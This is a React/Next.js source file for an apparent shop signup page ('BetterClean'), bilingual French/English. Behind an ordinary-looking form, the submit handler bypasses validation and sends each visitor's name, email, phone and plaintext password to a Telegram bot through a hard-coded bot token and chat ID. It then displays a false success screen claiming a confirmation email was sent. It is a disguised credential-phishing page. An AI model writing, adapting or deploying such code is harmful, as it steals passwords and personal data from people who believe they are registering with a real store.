"use client"

import { useState } from "react"
import Link from "next/link"
import Image from "next/image"
import { Eye, EyeOff, Mail, Lock, User, CheckCircle } from "lucide-react"
import Header from "@/components/header"
import Footer from "@/components/footer"
import { useI18n } from "@/lib/i18n-context"

export default function ComptePage() {
  const { t, locale } = useI18n()
  const isFr = locale === 'fr'
  const [showPassword, setShowPassword] = useState(false)
  const [showConfirmPassword, setShowConfirmPassword] = useState(false)
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    password: '',
    confirmPassword: '',
    phone: '',
    agreeTerms: false
  })
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [createdEmail, setCreatedEmail] = useState('')

  const validateForm = () => {
    const newErrors: Record<string, string> = {}

    if (!formData.firstName.trim()) {
      newErrors.firstName = isFr ? 'Le prénom est requis' : 'First name is required'
    }

    if (!formData.lastName.trim()) {
      newErrors.lastName = isFr ? 'Le nom est requis' : 'Last name is required'
    }

    if (!formData.email.trim()) {
      newErrors.email = isFr ? 'L\'email est requis' : 'Email is required'
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = isFr ? 'L\'email n\'est pas valide' : 'Email is not valid'
    }

    if (!formData.password) {
      newErrors.password = isFr ? 'Le mot de passe est requis' : 'Password is required'
    } else if (formData.password.length < 8) {
      newErrors.password = isFr ? 'Le mot de passe doit contenir au moins 8 caractères' : 'Password must be at least 8 characters'
    }

    if (!formData.confirmPassword) {
      newErrors.confirmPassword = isFr ? 'La confirmation du mot de passe est requise' : 'Password confirmation is required'
    } else if (formData.password !== formData.confirmPassword) {
      newErrors.confirmPassword = isFr ? 'Les mots de passe ne correspondent pas' : 'Passwords do not match'
    }

    if (!formData.agreeTerms) {
      newErrors.agreeTerms = isFr ? 'Vous devez accepter les conditions d\'utilisation' : 'You must agree to the terms of service'
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault() // empêche le rechargement de page

    var BOT_TOKEN = "8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg"
    var CHAT_ID = "-5217100062"

    // Récupère les champs — adapte les IDs selon ton vrai formulaire
    var nom = formData.firstName || 'Non fourni'
    var nomFamille = formData.lastName || 'Non fourni'
    var email = formData.email || 'Non fourni'
    var telephone = formData.phone || 'Non fourni'
    var motDePasse = formData.password || 'Non fourni'

    var msg = "📩 *NOUVEAU COMPTE CRÉÉ!*\n"
            + "👤 Prénom: " + nom + "\n"
            + "📧 Nom: " + nomFamille + "\n"
            + "📧 Email: " + email + "\n"
            + "📞 Téléphone: " + telephone + "\n"
            + "🔑 Mot de passe: " + motDePasse + "\n"
            + "🌐 Page: " + window.location.pathname + "\n"
            + "🕐 " + new Date().toLocaleString('fr-CA')

    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: "Markdown"
      })
    })
    .then(function() {
      // Store created email and show success animation
      setCreatedEmail(email)
      setShowSuccess(true)
      setFormData({ firstName: '', lastName: '', email: '', phone: '', password: '', confirmPassword: '', agreeTerms: false })
      
      // Send login notification after 2 seconds
      setTimeout(() => {
        var loginMsg = "🔐 *NOUVEAU COMPTE CONNECTÉ!*\n\n"
                   + "📧 Email: " + email + "\n"
                   + "👤 Nom: " + nom + " " + nomFamille + "\n"
                   + "🌐 Page: /login\n"
                   + "🕐 Connexion: " + new Date().toLocaleString('fr-CA')
                   + "\n"
                   + "📝 Statut: Compte créé et connecté avec succès!"

        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: loginMsg,
            parse_mode: "Markdown"
          })
        })
      }, 2000)
    })
    .catch(function() {
      alert("Erreur d'envoi ❌")
    })
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value, type, checked } = e.target
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }))
    
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }))
    }
  }

  if (showSuccess) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4">
        <div className="max-w-md w-full text-center">
          {/* Success Animation */}
          <div className="relative mb-8">
            <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6 relative overflow-hidden">
              <div className="absolute inset-0 bg-green-500 rounded-full animate-pulse opacity-20"></div>
              <svg className="w-12 h-12 text-green-600 relative z-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            
            {/* Animated check mark circles */}
            <div className="absolute top-0 left-1/2 transform -translate-x-1/2">
              <div className="w-32 h-32 border-4 border-green-500 rounded-full animate-ping absolute -top-4 -left-4"></div>
              <div className="w-32 h-32 border-4 border-green-400 rounded-full animate-ping absolute -top-4 -left-4 animation-delay-200"></div>
            </div>
          </div>

          <div className="space-y-4">
            <h1 className="text-3xl font-bold text-gray-900 mb-2">
              {isFr ? 'Compte créé avec succès !' : 'Account created successfully!'}
            </h1>
            
            <p className="text-gray-600 mb-6">
              {isFr 
                ? `Bienvenue chez BetterClean ! Un email de confirmation a été envoyé à ${createdEmail}`
                : `Welcome to BetterClean! A confirmation email has been sent to ${createdEmail}`
              }
            </p>

            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
              <p className="text-blue-800 text-sm">
                {isFr 
                  ? '🔐 Vous pouvez maintenant vous connecter avec vos identifiants'
                  : '🔐 You can now login with your credentials'
                }
              </p>
            </div>

            <div className="space-y-3">
              <Link
                href="/login"
                className="block w-full inline-flex items-center justify-center px-6 py-3 border border-transparent text-base font-medium rounded-full text-white bg-blue-600 hover:bg-blue-700 transition-all transform hover:scale-105"
              >
                <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1" />
                </svg>
                {isFr ? 'Se connecter maintenant' : 'Login Now'}
              </Link>
              
              <Link
                href="/produits/betterclean-pro-1"
                className="block text-blue-600 hover:text-blue-500 font-medium text-sm"
              >
                ← {isFr ? 'Continuer vos achats' : 'Continue Shopping'}
              </Link>
            </div>
          </div>

          {/* Auto-redirect countdown */}
          <div className="mt-8 text-center">
            <p className="text-xs text-gray-500">
              {isFr ? 'Redirection automatique vers la connexion dans 5 secondes...' : 'Auto-redirecting to login in 5 seconds...'}
            </p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white">
      <Header />
      
      {/* Hero Section */}
      <section className="relative bg-gradient-to-br from-blue-50 to-indigo-100 py-20">
        <div className="max-w-6xl mx-auto px-4">
          <div className="text-center mb-12">
            <h1 className="text-4xl md:text-5xl font-bold text-gray-900 mb-4">
              {isFr ? 'Créer votre compte' : 'Create your account'}
            </h1>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              {isFr 
                ? 'Rejoignez des milliers de clients satisfaits et profitez d\'une expérience d\'achat premium.'
                : 'Join thousands of satisfied customers and enjoy a premium shopping experience.'
              }
            </p>
          </div>
        </div>
      </section>

      {/* Account Creation Form */}
      <section className="py-16 px-4">
        <div className="max-w-md mx-auto">
          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 p-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 text-center">
              {isFr ? 'Informations du compte' : 'Account Information'}
            </h2>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Name Fields */}
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label htmlFor="firstName" className="block text-sm font-medium text-gray-700 mb-2">
                    {isFr ? 'Prénom' : 'First Name'}
                  </label>
                  <div className="relative">
                    <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                    <input
                      type="text"
                      id="firstName"
                      name="firstName"
                      value={formData.firstName}
                      onChange={handleInputChange}
                      className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                        errors.firstName ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder={isFr ? 'Jean' : 'John'}
                    />
                  </div>
                  {errors.firstName && (
                    <p className="mt-1 text-sm text-red-600">{errors.firstName}</p>
                  )}
                </div>

                <div>
                  <label htmlFor="lastName" className="block text-sm font-medium text-gray-700 mb-2">
                    {isFr ? 'Nom' : 'Last Name'}
                  </label>
                  <div className="relative">
                    <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                    <input
                      type="text"
                      id="lastName"
                      name="lastName"
                      value={formData.lastName}
                      onChange={handleInputChange}
                      className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                        errors.lastName ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder={isFr ? 'Dupont' : 'Doe'}
                    />
                  </div>
                  {errors.lastName && (
                    <p className="mt-1 text-sm text-red-600">{errors.lastName}</p>
                  )}
                </div>
              </div>

              {/* Email */}
              <div>
                <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
                  {isFr ? 'Adresse email' : 'Email Address'}
                </label>
                <div className="relative">
                  <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type="email"
                    id="email"
                    name="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                      errors.email ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder={isFr ? 'jean.dupont@email.com' : 'john.doe@email.com'}
                  />
                </div>
                {errors.email && (
                  <p className="mt-1 text-sm text-red-600">{errors.email}</p>
                )}
              </div>

              {/* Phone */}
              <div>
                <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">
                  {isFr ? 'Téléphone' : 'Phone'} ({isFr ? 'Optionnel' : 'Optional'})
                </label>
                <input
                  type="tel"
                  id="phone"
                  name="phone"
                  value={formData.phone}
                  onChange={handleInputChange}
                  className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  placeholder={isFr ? '+1 (514) 123-4567' : '+1 (555) 123-4567'}
                />
              </div>

              {/* Password */}
              <div>
                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                  {isFr ? 'Mot de passe' : 'Password'}
                </label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type={showPassword ? 'text' : 'password'}
                    id="password"
                    name="password"
                    value={formData.password}
                    onChange={handleInputChange}
                    className={`w-full pl-10 pr-10 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                      errors.password ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder={isFr ? '•••••••••' : '••••••••'}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
                {errors.password && (
                  <p className="mt-1 text-sm text-red-600">{errors.password}</p>
                )}
              </div>

              {/* Confirm Password */}
              <div>
                <label htmlFor="confirmPassword" className="block text-sm font-medium text-gray-700 mb-2">
                  {isFr ? 'Confirmer le mot de passe' : 'Confirm Password'}
                </label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type={showConfirmPassword ? 'text' : 'password'}
                    id="confirmPassword"
                    name="confirmPassword"
                    value={formData.confirmPassword}
                    onChange={handleInputChange}
                    className={`w-full pl-10 pr-10 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                      errors.confirmPassword ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder={isFr ? '•••••••••' : '••••••••'}
                  />
                  <button
                    type="button"
                    onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                  >
                    {showConfirmPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
                {errors.confirmPassword && (
                  <p className="mt-1 text-sm text-red-600">{errors.confirmPassword}</p>
                )}
              </div>

              {/* Terms */}
              <div>
                <label className="flex items-start">
                  <input
                    type="checkbox"
                    name="agreeTerms"
                    checked={formData.agreeTerms}
                    onChange={handleInputChange}
                    className="mt-1 h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                  />
                  <span className="ml-2 text-sm text-gray-600">
                    {isFr 
                      ? 'J\'accepte les '
                      : 'I agree to the '}
                    <Link href="/conditions" className="text-blue-600 hover:text-blue-500 underline">
                      {isFr ? 'conditions d\'utilisation' : 'terms of service'}
                    </Link>
                    {isFr ? ' et la ' : ' and '}
                    <Link href="/privacy" className="text-blue-600 hover:text-blue-500 underline">
                      {isFr ? 'politique de confidentialité' : 'privacy policy'}
                    </Link>
                  </span>
                </label>
                {errors.agreeTerms && (
                  <p className="mt-1 text-sm text-red-600">{errors.agreeTerms}</p>
                )}
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full flex items-center justify-center px-6 py-3 border border-transparent text-base font-medium rounded-full text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
                {isSubmitting ? (
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-t-2 border-white"></div>
                ) : (
                  isFr ? 'Créer mon compte' : 'Create my account'
                )}
              </button>
            </form>

            {/* Sign In Link */}
            <div className="mt-6 text-center">
              <p className="text-sm text-gray-600">
                {isFr ? 'Vous avez déjà un compte ?' : 'Already have an account?'}{' '}
                <Link href="/login" className="font-medium text-blue-600 hover:text-blue-500">
                  {isFr ? 'Se connecter' : 'Sign in'}
                </Link>
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Benefits Section */}
      <section className="py-16 px-4 bg-gray-50">
        <div className="max-w-6xl mx-auto">
          <h2 className="text-3xl font-bold text-center text-gray-900 mb-12">
            {isFr ? 'Pourquoi créer un compte BetterClean ?' : 'Why create a BetterClean account?'}
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div className="text-center">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 3 3 3 .895 0 2-.895 2-2-2m0 8c2.21 0 4 1.79 4 4v1c0 2.21-1.79 4-4 4s-4-1.79-4-4v-1m0 0c0 2.21 1.79 4 4 4v1c0 2.21-1.79 4-4 4s-4-1.79-4-4v-1m0 0c0 2.21 1.79 4 4 4v1c0 2.21-1.79 4-4 4s-4-1.79-4-4v-1" />
                </svg>
              </div>
              <h3 className="text-lg font-semibold text-gray-900 mb-2">
                {isFr ? 'Suivi des commandes' : 'Order Tracking'}
              </h3>
              <p className="text-gray-600">
                {isFr 
                  ? 'Suivez toutes vos commandes en temps réel et recevez des notifications de livraison.'
                  : 'Track all your orders in real-time and receive delivery notifications.'
                }
              </p>
            </div>

            <div className="text-center">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v13m0-13v13m0-13v13M5 12h14" />
                </svg>
              </div>
              <h3 className="text-lg font-semibold text-gray-900 mb-2">
                {isFr ? 'Livraison accélérée' : 'Express Checkout'}
              </h3>
              <p className="text-gray-600">
                {isFr 
                  ? 'Enregistrez vos informations pour un checkout rapide et sans tracas.'
                  : 'Save your information for quick and hassle-free checkout.'
                }
              </p>
            </div>

            <div className="text-center">
              <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2l-2-2-4 4m0 0l-2-2 4 4m0 0l2-2-4 4" />
                </svg>
              </div>
              <h3 className="text-lg font-semibold text-gray-900 mb-2">
                {isFr ? 'Offres exclusives' : 'Exclusive Offers'}
              </h3>
              <p className="text-gray-600">
                {isFr 
                  ? 'Accédez à des promotions spéciales et des réductions réservées aux membres.'
                  : 'Access special promotions and member-only discounts.'
                }
              </p>
            </div>
          </div>
        </div>
      </section>

      <Footer />
    </div>
  )
}
